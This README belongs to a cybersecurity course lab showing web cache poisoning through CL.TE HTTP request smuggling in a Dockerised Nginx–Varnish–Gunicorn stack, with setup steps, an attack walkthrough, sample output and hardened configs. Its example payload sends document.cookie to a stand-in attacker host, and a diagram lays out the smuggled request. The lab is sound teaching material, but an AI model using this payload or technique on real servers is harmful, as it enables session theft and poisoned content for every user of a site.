# HRS-Desynchronization

> **Cybersecurity Course Project** – Professional lab demonstrating
> **Web Cache Poisoning via CL.TE HTTP Request Smuggling** in a three-tier
> architecture (Nginx → Varnish → Gunicorn/Flask).

---

## Architecture Overview

```
  ┌─────────────┐   port 80    ┌───────────────────┐  :6081  ┌──────────────────┐  :8000  ┌──────────────────────┐
  │  Attacker   │──keep-alive─▶│  Nginx            │────────▶│  Varnish         │────────▶│  Gunicorn / Flask    │
  │  attack.py  │              │  (frontend-proxy) │         │  (cache-layer)   │         │  (backend-origin)    │
  └─────────────┘              │  Trusts CL        │         │  Caches .js/.css │         │  Trusts TE:chunked   │
                               │  Forwards TE      │         │  1-hour TTL      │         │  /  /js/app.js       │
                               └───────────────────┘         └──────────────────┘         │  /reflect?q=         │
                                                                                           │  /admin              │
                                                                                           └──────────────────────┘
```

### CL.TE Desynchronization – Buffer Poisoning Sequence

```mermaid
sequenceDiagram
    participant A as Attacker<br/>(attack.py)
    participant N as Nginx<br/>(frontend-proxy)
    participant V as Varnish<br/>(cache-layer)
    participant G as Gunicorn<br/>(backend-origin)

    Note over A,G: Phase 1 — Plant the smuggled prefix

    A->>N: POST /js/app.js<br/>Content-Length: N<br/>Transfer-Encoding: chunked<br/><br/>[chunk data]<br/>0\r\n\r\n<br/>GET /reflect?q=PAYLOAD HTTP/1.1\r\nHost: ...\r\nX-Ignore: 
    N->>V: Full POST body forwarded<br/>(Nginx trusts Content-Length)
    V->>G: POST /js/app.js forwarded<br/>(Varnish passes through TE header)
    Note over G: Gunicorn trusts TE:chunked<br/>Reads up to 0\r\n\r\n<br/>Leaves GET /reflect?q=... in socket buffer ⚠️
    G-->>V: HTTP 200 OK (POST response)
    V-->>N: 200 OK
    N-->>A: 200 OK

    Note over A,G: Phase 2 — Trigger the cache poisoning

    A->>N: GET /js/app.js (same TCP connection)
    N->>V: GET /js/app.js
    V->>V: Cache MISS for /js/app.js
    Note over V: Reuses keep-alive connection to Gunicorn
    V->>G: GET /js/app.js (same socket as before)
    Note over G: Socket buffer already contains<br/>GET /reflect?q=PAYLOAD ...\r\nX-Ignore: <br/>Gunicorn prepends it → processes GET /reflect?q=PAYLOAD
    G-->>V: HTTP 200 OK<br/>Content: <html><body>PAYLOAD</body></html>
    Note over V: Varnish caches this response<br/>under cache key: /js/app.js ⚠️
    V-->>N: 200 OK (poisoned response)
    N-->>A: 200 OK (poisoned response)

    Note over A,G: Phase 3 — All users receive poisoned content

    participant U as Victim User
    U->>N: GET /js/app.js (new connection)
    N->>V: GET /js/app.js
    V->>V: Cache HIT 🎯
    V-->>N: Cached poisoned response
    N-->>U: <html><body>PAYLOAD</body></html>
```

### Header trust matrix

| Layer | Trusts | Ignores | Effect |
|-------|--------|---------|--------|
| **Nginx** (frontend-proxy) | `Content-Length` | `Transfer-Encoding` | Forwards entire body including smuggled suffix |
| **Varnish** (cache-layer) | Forwards headers as-is | Does not strip TE | Passes the TE header to Gunicorn |
| **Gunicorn** (backend-origin) | `Transfer-Encoding: chunked` | `Content-Length` | Stops at `0\r\n\r\n`, leaves prefix in socket buffer |

---

## Repository Layout

```
HRS-Desynchronization/
├── docker-compose.yml          # Three-tier service definitions
├── nginx/
│   ├── Dockerfile              # nginx:1.25-alpine
│   └── nginx.conf              # Desync-enabling (lenient) proxy config
├── varnish/
│   ├── Dockerfile              # alpine:3.19 + varnish package
│   └── default.vcl             # Caches .js/.css for 1 h; passes TE to origin
├── backend/
│   ├── Dockerfile              # python:3.12-alpine
│   ├── requirements.txt        # Flask + Gunicorn
│   ├── app.py                  # Routes: / /js/app.js /reflect /admin
│   └── wsgi.py                 # Gunicorn sync worker + keepalive config
├── exploit/
│   ├── attack.py               # CL.TE + cache-poisoning exploit (raw sockets + h2)
│   └── requirements.txt        # h2>=4.0
├── mitigation/
│   ├── nginx.conf              # Hardened: reject dual-length headers, strip TE
│   └── default.vcl             # Hardened: strip TE, Connection:close to origin
├── exploit.py                  # (Legacy) two-tier CL.TE PoC (Nginx → Gunicorn)
└── README.md
```

---

## Phase 1 – Setup

### Prerequisites

- Docker ≥ 24 and Docker Compose v2
- Python ≥ 3.10 with `pip` (for the exploit script)

### Start the stack

```bash
# Build images and start all three containers in the background
docker compose up --build -d

# Verify all three containers are running
docker compose ps
```

Expected output:

```
NAME                              STATUS          PORTS
hrs-...-frontend-proxy-1          Up              0.0.0.0:80->80/tcp
hrs-...-cache-layer-1             Up              6081/tcp
hrs-...-backend-origin-1          Up              8000/tcp
```

### Confirm normal operation

```bash
# Public homepage
curl -i http://localhost/

# Static JavaScript file (first request: cache MISS)
curl -i http://localhost/js/app.js

# Reflection endpoint
curl -i "http://localhost/reflect?q=hello"
```

---

## Phase 2 – Exploit: Web Cache Poisoning via CL.TE

### Install exploit dependencies

```bash
pip install -r exploit/requirements.txt
```

### Run the attack

```bash
python exploit/attack.py --host localhost --port 80
```

With a custom payload:

```bash
python exploit/attack.py \
  --host localhost \
  --port 80 \
  --payload '<script>fetch("https://attacker.example/steal?c="+document.cookie)</script>'
```

### What happens step-by-step

1. **Phase 0 (HTTP/2 probe)** – The exploit uses the `h2` library to check
   whether the frontend also exposes an H2.CL smuggling surface.

2. **Phase 1 (CL.TE attack)** – A single `POST /js/app.js` is sent with both
   `Content-Length` and `Transfer-Encoding: chunked`.
   - Nginx trusts `Content-Length` and forwards every byte to Varnish.
   - Varnish passes the request to Gunicorn.
   - Gunicorn trusts `Transfer-Encoding`, stops at `0\r\n\r\n`, leaving
     `GET /reflect?q=<payload>` in the keep-alive socket buffer.

3. **Phase 2 (trigger)** – A `GET /js/app.js` is sent on the **same TCP
   connection**.  Varnish fetches from origin (cache MISS) on the same
   keep-alive socket; Gunicorn prepends the smuggled prefix and returns the
   `/reflect` response.  **Varnish caches this response under `/js/app.js`**.

4. **Phase 3 (verify)** – A fresh connection requests `/js/app.js`.  Varnish
   returns the poisoned cached response (`X-Cache: HIT`).

### Sample successful output

```
[*] Target  : localhost:80
[*] Payload : "<script>alert('Cache Poisoned!')</script>"

[*] Phase 0 – Probing for HTTP/2 support (h2 library) …
[*]  Server does not advertise HTTP/2 (or probe timed out).

[*] Phase 1 – Sending CL.TE smuggling request …
...

[*] Phase 2 – Sending trigger GET /js/app.js (same connection) …
...

[*] Phase 3 – Verifying cache poisoning on a NEW connection …
[*] Cached response for /js/app.js:
HTTP/1.1 200 OK
X-Cache: HIT
...
<html><body><script>alert('Cache Poisoned!')</script></body></html>

[+] SUCCESS – /js/app.js cache is poisoned with the injected payload!
    All users requesting /js/app.js will receive the attacker's content.
```

---

## Phase 3 – Mitigation

Apply the hardened configuration files from the `mitigation/` directory:

```bash
# Replace the vulnerable Nginx config
cp mitigation/nginx.conf nginx/nginx.conf

# Replace the vulnerable Varnish VCL
cp mitigation/default.vcl varnish/default.vcl

# Rebuild and restart
docker compose up --build -d
```

### Mitigation summary

| Layer | Vulnerability | Mitigation |
|-------|--------------|------------|
| **Nginx** | Forwards both `Content-Length` and `Transfer-Encoding` | Reject requests with dual-length headers (HTTP 400); strip `Transfer-Encoding` before proxying; enable `proxy_request_buffering on` |
| **Varnish** | Passes `Transfer-Encoding` to origin; reuses keep-alive sockets | Strip `Transfer-Encoding` in `vcl_backend_fetch`; set `Connection: close` on origin fetches; reject dual-length requests with a 400 synth |
| **Gunicorn** | Trusts `Transfer-Encoding` over `Content-Length` | Addressed by removing TE from upstream headers (Nginx/Varnish mitigations) |

### Additional hardening recommendations

| Measure | Effect |
|---------|--------|
| Enable HTTP/2 (`listen 443 ssl http2`) | Eliminates CL.TE/TE.CL ambiguity at the protocol level |
| WAF: normalise TE headers | Strip/reject `Transfer-Encoding` variants before they reach proxies |
| Single authoritative parser (e.g. Envoy) | Buffers entire requests before forwarding, preventing partial-write races |
| Gunicorn `--forwarded-allow-ips` | Prevents forged `X-Forwarded-*` header injection |
| Varnish `ban` on poisoned keys | Emergency response: purge known-poisoned cache entries immediately |

---

## Teardown

```bash
docker compose down
```

---

## Disclaimer

This project is created **solely for educational purposes** as part of a
cybersecurity course.  Do **not** use these techniques against systems you do
not own or have explicit written permission to test.

